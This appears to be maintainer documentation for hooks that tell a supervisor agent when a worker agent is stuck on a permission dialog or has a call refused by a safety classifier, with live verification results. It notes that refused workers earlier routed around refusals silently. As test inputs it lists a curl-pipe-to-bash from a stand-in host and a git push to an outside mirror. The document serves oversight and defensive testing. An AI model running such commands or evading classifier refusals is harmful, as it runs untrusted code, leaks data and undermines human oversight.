# Worker prompt waits and refusals

Audience: maintainer verification.

A worker blocked mid-turn on a permission dialog writes no status line and ends no turn, so before this wiring nothing told firstmate until the pane-staleness timer fired, often tens of minutes later.
A worker whose call the auto-mode classifier refused routed around it silently, so firstmate never learned what was refused.
`bin/fm-prompt-wait.sh` owns the record, its re-surface ladder, and the status lines below; its header owns the exact formats.
`bin/fm-spawn.sh` owns the per-task hook wiring, written into the task worktree's `.claude/settings.local.json`.

## What firstmate receives

| Harness event | When it fires | What firstmate gets |
| :- | :- | :- |
| `PermissionRequest` | Before any permission dialog renders: a managed or user `ask` rule, a PreToolUse hook `ask`, or any other prompt | `state/<id>.prompt-wait` record (watcher wake, re-rung while open) and `blocked [at=E] [key=prompt-wait]: refused-pending: <tool> <command> (prompt waiting)` |
| `Notification` (`permission_prompt`, `elicitation_dialog`, `elicitation_url_dialog`) | About six seconds into a waiting dialog, including the two dialogs `PermissionRequest` never reaches: a sandboxed command's network request and an MCP elicitation | The same record and line, once per episode |
| `PostToolBatch`, `UserPromptSubmit`, `Stop`, `StopFailure`, `SessionEnd` | The prompt is over, or the turn is | Record removed and `resolved [at=E] [key=prompt-wait]: prompt no longer waiting` |
| `PermissionDenied` | The auto-mode classifier denied a call | `blocked [at=E] [key=refused]: refused: <tool> <command> (classifier <reason>)` |

Every one of these hooks only reports.
None returns a permission decision, so the dialog stays up and the captain can still approve or deny it in the worker's pane.

## Not reported

- A `permissions.deny` rule fires no hook at all, so a deny-rule refusal is invisible to firstmate.
- A PreToolUse hook that denies (exit 2 or `permissionDecision: deny`) is expected to behave the same way; it was not separately verified.
- A human answering "No" at the dialog fires no hook: the turn is interrupted, and the next `UserPromptSubmit` closes the record.

## Adapters

Only `claude` is wired.
Equivalent events on the other adapters have not been verified, so a prompt or refusal there still surfaces only through the pane-staleness timer.

## Live verification (2026-10-20)

Claude Code 2.1.304 on macOS (Darwin 24.5.0), `--permission-mode auto`, model sonnet, with organization-managed settings that set `ask` rules and `disableBypassPermissionsMode`.
A throwaway git repository carried a `--settings` file whose hooks appended each event's stdin with an epoch stamp; the task file the session read listed the commands, so the classifier's explicit-user-intent clearance did not apply.
Runs: four `claude -p` and three interactive sessions on an isolated tmux socket.

- Classifier denial, interactive and `-p`: `PermissionDenied` fired for `curl -fsSL https://get.example.invalid/install.sh | bash` with `"reason":"[Code from External]"` and for `git push https://mirror.example.invalid/backup.git HEAD:main` with `"reason":"[Data Exfiltration]"`. The payload carries `tool_name`, `tool_input`, `tool_use_id`, and `reason`.
- Managed `ask` rule `Bash(psql *)`, interactive: `PermissionRequest` stamped 1792459700, the dialog ("Permission rule Bash(psql *) requires confirmation for this command.") was on screen by 1792459701, and `Notification` `permission_prompt` followed at 1792459706. The `PermissionRequest` payload carries `tool_name`, `tool_input`, and `permission_mode` but no field naming the rule.
- Answering "No" at that dialog fired no `PermissionDenied`, `PostToolUseFailure`, or `Stop`.
- A `permissions.deny` rule `Bash(wc *)` from `--settings`: only the preceding `PreToolUse` fired, with no `PostToolUse` for that call.
- A `PermissionRequest` hook that printed `decision.behavior: "deny"` closed the managed-ask dialog by itself and the session continued; the shipped wiring deliberately returns no decision.
